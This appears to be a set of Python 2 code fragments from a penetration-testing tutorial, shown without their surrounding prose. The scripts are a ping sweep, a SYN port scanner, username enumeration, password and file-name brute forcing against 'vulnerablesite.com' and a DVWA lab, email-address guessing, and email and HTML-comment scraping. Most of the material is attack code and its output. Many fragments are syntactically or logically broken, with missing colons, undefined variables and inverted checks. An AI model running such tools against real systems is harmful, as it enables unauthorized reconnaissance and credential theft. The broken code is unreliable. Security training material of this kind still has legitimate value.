["```py\n$ sudo apt-get install python-scapy\n\n```", "```py\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n\nimport sys \nfrom scapy.all import *\n\nif len(sys.argv) !=3:\n    print \"usage: %s start_ip_addr end_ip_addr\" % (sys.argv[0])\n    sys.exit(0)\n\nlivehosts=[]\n#IP address validation\nipregex=re.compile(\"^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$\")\n\nif (ipregex.match(sys.argv[1]) is None):\n  print \"Starting IP address is invalid\"\n  sys.exit(0)\nif (ipregex.match(sys.argv[1]) is None):\n  print \"End IP address is invalid\"\n  sys.exit(0)\n\niplist1 = sys.argv[1].split(\".\")\niplist2 = sys.argv[2].split(\".\")\n\nif not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])\n  print \"IP addresses are not in the same class C subnet\"\n  sys.exit(0)\t\n\nif iplist1[3]>iplist2[3]:\n  print \"Starting IP address is greater than ending IP address\"\n  sys.exit(0)\n\nnetworkaddr = iplist1[0]+\".\"+iplist1[1]+\".\"+iplist[2]+\".\"\n\nstart_ip_last_octet = int(iplist1[3])\nend_ip_last_octet = int(iplist2[3])\n\nif iplist1[3]<iplist2[3]:\n  print \"Pinging range \"+networkaddr+str(start_ip_last_octet)+\"- \"+str(end_ip_last_octet)\nelse\n  print \"Pinging \"+networkaddr+str(startiplastoctect)+\"\\n\"\n\nfor x in range(start_ip_last_octet, end_ip_last_octet+1)\n  packet=IP(dst=networkaddr+str(x))/ICMP()\n  response = sr1(packet,timeout=2,verbose=0)\n  if not (response is None):\n    if  response[ICMP].type==0:\n      livehosts.append(networkaddr+str(x))\n\nprint \"Scan complete!\\n\"\nif len(livehosts)>0:\n  print \"Hosts found:\\n\"\n  for host in livehosts:\n    print host+\"\\n\"\nelse:\n  print \"No live hosts found\\n\"\n```", "```py\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n```", "```py\nimport sys \nfrom scapy.all import *\n\nif len(sys.argv) !=3:\n    print \"usage: %s start_ip_addr end_ip_addr\" % (sys.argv[0])\n    sys.exit(0)\n\nlivehosts=[]\n```", "```py\n#IP address validation\nipregex=re.compile(\"^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$\")\n\nif (ipregex.match(sys.argv[1]) is None):\n  print \"Starting IP address is invalid\"\n  sys.exit(0)\nif (ipregex.match(sys.argv[1]) is None):\n  print \"End IP address is invalid\"\n  sys.exit(0)\n```", "```py\niplist1 = sys.argv[1].split(\".\")\niplist2 = sys.argv[2].split(\".\")\n\nif not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])\n  print \"IP addresses are not in the same class C subnet\"\n  sys.exit(0)\n\nif iplist1[3]>iplist2[3]:\n  print \"Starting IP address is greater than ending IP address\"\n  sys.exit(0)\n\nnetworkaddr = iplist1[0]+\".\"+iplist1[1]+\".\"+iplist[2]+\".\"\n\nstart_ip_last_octet = int(iplist1[3])\nend_ip_last_octet = int(iplist2[3])\n```", "```py\nif iplist1[3]<iplist2[3]:\n  print \"Pinging range \"+networkaddr+str(start_ip_last_octet)+\"- \"+str(end_ip_last_octet)\nelse\n  print \"Pinging \"+networkaddr+str(startiplastoctect)+\"\\n\"\n```", "```py\nfor x in range(start_ip_last_octet, end_ip_last_octet+1)\n  packet=IP(dst=networkaddr+str(x))/ICMP()\n```", "```py\nresponse = sr1(packet,timeout=2,verbose=0)\n```", "```py\nif not (response is None):\n    if  response[ICMP].type==0:\n      livehosts.append(networkaddr+str(x))\n```", "```py\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n\nimport sys \nfrom scapy.all import *\n\nif len(sys.argv) !=4:\n    print \"usage: %s target startport endport\" % (sys.argv[0])\n    sys.exit(0)\n\ntarget = str(sys.argv[1])\nstartport = int(sys.argv[2])\nendport = int(sys.argv[3])\nprint \"Scanning \"+target+\" for open TCP ports\\n\"\nif startport==endport:\n  endport+=1\nfor x in range(startport,endport):\n    packet = IP(dst=target)/TCP(dport=x,flags=\"S\")\n    response = sr1(packet,timeout=0.5,verbose=0)\n    if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:\n    print \"Port \"+str(x)+\" is open!\"\n    sr(IP(dst=target)/TCP(dport=response.sport,flags=\"R\"), timeout=0.5, verbose=0)\n\nprint \"Scan complete!\\n\"\n```", "```py\nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n```", "```py\nWARNING: No route found for IPv6 destination :: (no default route?)\n\n```", "```py\npacket = IP(dst=target)/TCP(dport=x,flags=\"S\")\n```", "```py\nsr(IP(dst=target)/TCP(dport=response.sport,flags=\"R\"),timeout=0.5, verbose=0)\n```", "```py\n#basic username check\nimport sys\nimport urllib\nimport urllib2\n\nif len(sys.argv) !=2:\n    print \"usage: %s username\" % (sys.argv[0])\n    sys.exit(0)\n\nurl = \"http://www.vulnerablesite.com/resetpassword.html\"\nusername = str(sys.argv[1])\ndata = urllib.urlencode({\"username\":username})\nresponse = urllib2.urlopen(url,data).read()\nUnknownStr=\"Username not found\"\nif(response.find(UnknownStr)<0):\n  print \"Username does not exist\\n\"\nelse\n  print \"Username exists!\"\n```", "```py\nuser@pc:~# python usernamecheck.py randomusername\n\nUsername does not exist\n\nuser@pc:~# python usernamecheck.py admin\n\nUsername exists!\n\n```", "```py\ndata = urllib.urlencode({\"username\":username})\n```", "```py\nUnknownStr=\"Username not found\"\n```", "```py\n#brute force username enumeration\nimport sys\nimport urllib\nimport urllib2\n\nif len(sys.argv) !=2:\n    print \"usage: %s filename\" % (sys.argv[0])\n    sys.exit(0)\n\nfilename=str(sys.argv[1])\nuserlist = open(filename,'r')\nurl = \"http://www.vulnerablesite.com/forgotpassword.html\"\nfoundusers = []\nUnknownStr=\"Username not found\"\n\nfor user in userlist:\n  user=user.rstrip()\n  data = urllib.urlencode({\"username\":user})\n  request = urllib2.urlopen(url,data)\n  response = request.read()\n\n  if(response.find(UnknownStr)>=0):\n    foundusers.append(user)\n  request.close()\nuserlist.close()\n\nif len(foundusers)>0:\n  print \"Found Users:\\n\"\n  for name in foundusers:\n    print name+\"\\n\"\nelse:\n  print \"No users found\\n\"\n```", "```py\npython bruteusernames.py userlist.txt\nFound Users:\nadmin\nangela\nbob\njohn\n\n```", "```py\nuserlist = open(filename,'r')\n```", "```py\nuser=user.strip()\n```", "```py\n#bruteforce file names\nimport sys\nimport urllib2\n\nif len(sys.argv) !=4:\n    print \"usage: %s url wordlist fileextension\\n\" % (sys.argv[0])\n    sys.exit(0)\n\nbase_url = str(sys.argv[1])\nwordlist= str(sys.argv[2])\nextension=str(sys.argv[3])\nfilelist = open(wordlist,'r')\nfoundfiles = []\n\nfor file in filelist:\n  file=file.strip(\"\\n\")\n  extension=extension.rstrip()\n  url=base_url+file+\".\"+str(extension.strip(\".\"))\n  try:\n    request = urllib2.urlopen(url)\n    if(request.getcode()==200):\n      foundfiles.append(file+\".\"+extension.strip(\".\"))\n    request.close()\n  except urllib2.HTTPError, e:\n    pass\n\nif len(foundfiles)>0:\n  print \"The following files exist:\\n\"\n  for filename in foundfiles:\n    print filename+\"\\n\"\nelse:\n  print \"No files found\\n\"\n```", "```py\npython filebrute.py http://192.168.68.137/dvwa/ filelist.txt .php\nThe following files exist:\n\nindex.php\n\nabout.php\n\nlogin.php\n\nsecurity.php\n\nlogout.php\n\nsetup.php\n\ninstructions.php\n\nphpinfo.php\n\n```", "```py\nfilelist = open(wordlist,'r')\n```", "```py\n  file=file.strip(\"\\n\")\n  extension=extension.rstrip()\n  url=base_url+file+\".\"+str(extension.strip(\".\"))\n```", "```py\n  try:\n    request = urllib2.urlopen(url)\n    if(request.getcode()==200):\n      foundfiles.append(file+\".\"+extension.strip(\".\"))\n    request.close()\n  except urllib2.HTTPError, e:\n    pass\n```", "```py\n#brute force passwords\nimport sys\nimport urllib\nimport urllib2\n\nif len(sys.argv) !=3:\n    print \"usage: %s userlist passwordlist\" % (sys.argv[0])\n    sys.exit(0)\n\nfilename1=str(sys.argv[1])\nfilename2=str(sys.argv[2])\nuserlist = open(filename1,'r')\npasswordlist = open(filename2,'r')\nurl = \"http://www.vulnerablesite.com/login.html\"\nfoundusers = []\nFailStr=\"Incorrect User or Password\"\n\nfor user in userlist:\n  for password in passwordlist:\n    data = urllib.urlencode({\"username=\"user&\"password=\"password})\n    request = urllib2.urlopen(url,data)\n    response = request.read()\n    if(response.find(FailStr)<0)\n      foundcreds.append(user+\":\"+password)\n    request.close()\n\nif len(foundcreds)>0:\n  print \"Found User and Password combinations:\\n\"\n  for name in foundcreds:\n    print name+\"\\n\"\nelse:\n  print \"No users found\\n\"\n```", "```py\npython bruteforcepasswords.py userlists.txt passwordlist.txt\n\nFound User and Password combinations:\n\nroot:toor\n\nangela:trustno1\n\nbob:password123\n\njohn:qwerty\n\n```", "```py\nfilename1=str(sys.argv[1])\nfilename2=str(sys.argv[2])\nuserlist = open(filename1,'r')\npasswordlist = open(filename2,'r')\n```", "```py\nurl = \"http://www.vulnerablesite.com/login.html\"\nfoundusers = []\nFailStr=\"Incorrect User or Password\"\n```", "```py\nfor user in userlist:\n  for password in passwordlist:\n    data = urllib.urlencode({\"username=\"user&\"password=\"password })\n    request = urllib2.urlopen(url,data)\n    response = request.read()\n    if(response.find(FailStr)<0)\n      foundcreds.append(user+\":\"+password)\n    request.close()\n```", "```py\nif len(foundcreds)>0:\n  print \"Found User and Password combinations:\\n\"\n  for name in foundcreds:\n    print name+\"\\n\"\nelse:\n  print \"No users found\\n\"\n```", "```py\nimport sys\n\nif len(sys.argv) !=3:\n  print \"usage: %s name.txt email suffix\" % (sys.argv[0])\n  sys.exit(0)\nfor line in open(sys.argv[1]):\n  name = ''.join([c for c in line if c == \" \" or c.isalpha()])\n  tokens = name.lower().split()\n  fname = tokens[0]\n  lname = tokens[-1]\n  print fname+lname+sys.argv[2]\n  print lname+fname+sys.argv[2]\n  print fname+\".\"+lname+sys.argv[2]\n  print lname+\".\"+fname+sys.argv[2]\n  print lname+fname[0]+sys.argv[2]\n  print fname+lname+fname+sys.argv[2]\n  print fname[0]+lname+sys.argv[2]\n  print fname[0]+\".\"+lname+sys.argv[2]\n  print lname[0]+\".\"+fname+sys.argv[2]\n  print fname+sys.argv[2]\n  print lname+sys.argv[2]\n```", "```py\nimport urllib2\nimport re\nimport time\nfrom random import randint\nregex = re.compile((\"([a-z0-9!#$%&'*+\\/=?^_'{|}~-]+(?:\\.[a-z0- 9!#$%&'*+\\/=?^_'\"\n                    \"{|}~-]+)*(@|\\sat\\s)(?:[a-z0-9](?:[a-z0-9- ]*[a-z0-9])?(\\.|\"\n                    \"\\sdot\\s))+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\"))\n\ntarurl = open(\"urls.txt\", \"r\")\nfor line in tarurl:\n  output = open(\"emails.txt\", \"a\")\n  time.sleep(randint(10, 100))\n  try: \n    url = urllib2.urlopen(line).read()\n    output.write(line)\n    emails = re.findall(regex, url)\n    for email in emails:\n      output.write(email[0]+\"\\r\\n\")\n      print email[0]\n  except:\n    pass\n    print \"error\"\n  output.close()\n```", "```py\nregex = re.compile((\"([a-z0-9!#$%&'*+\\/=?^_'{|}~-]+(?:\\.[a-z0- 9!#$%&'*+\\/=?^_'\"\n                    \"{|}~-]+)*(@|\\sat\\s)(?:[a-z0-9](?:[a-z0-9- ]*[a-z0-9])?(\\.|\"\n                    \"\\sdot\\s))+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\"))\n```", "```py\ntarurl = open(\"urls.txt\", \"r\")\n```", "```py\noutput = open(\"emails.txt\", \"a\")\n```", "```py\ntime.sleep(randint(10, 100))\n```", "```py\nemails = re.findall(regex, url)\n```", "```py\n    for email in emails:\n      output.write(email[0]+\"\\r\\n\")\n      print email[0]\n```", "```py\nimport requests\nimport re\n\nfrom bs4 import BeautifulSoup\nimport sys\n\nif len(sys.argv) !=2:\n    print \"usage: %s targeturl\" % (sys.argv[0])\n    sys.exit(0)\n\nurls = []\n\ntarurl = sys.argv[1]\nurl = requests.get(tarurl)\ncomments = re.findall('<!--(.*)-->',url.text)\nprint \"Comments on page: \"+tarurl\nfor comment in comments:\n    print comment\n\nsoup = BeautifulSoup(url.text)\nfor line in soup.find_all('a'):\n    newline = line.get('href')\n    try:\n        if newline[:4] == \"http\":\n            if tarurl in newline:\n                urls.append(str(newline))\n        elif newline[:1] == \"/\":\n            combline = tarurl+newline\n            urls.append(str(combline))\n    except:\n        pass\n        print \"failed\"\nfor uurl in urls:\n    print \"Comments on page: \"+uurl\n    url = requests.get(uurl)\n    comments = re.findall('<!--(.*)-->',url.text)\n    for comment in comments:\n        print comment\n```", "```py\nfrom bs4 import BeautifulSoup\n```", "```py\nurl = requests.get(tarurl)\ncomments = re.findall('<!--(.*)-->',url.text)\nprint \"Comments on page: \"+tarurl\nfor comment in comments:\n    print comment\n```", "```py\nif newline[:4] == \"http\":\n            if tarurl in newline:\n                urls.append(str(newline))\n        elif newline[:1] == \"/\":\n            combline = tarurl+newline\n            urls.append(str(combline))\n```"]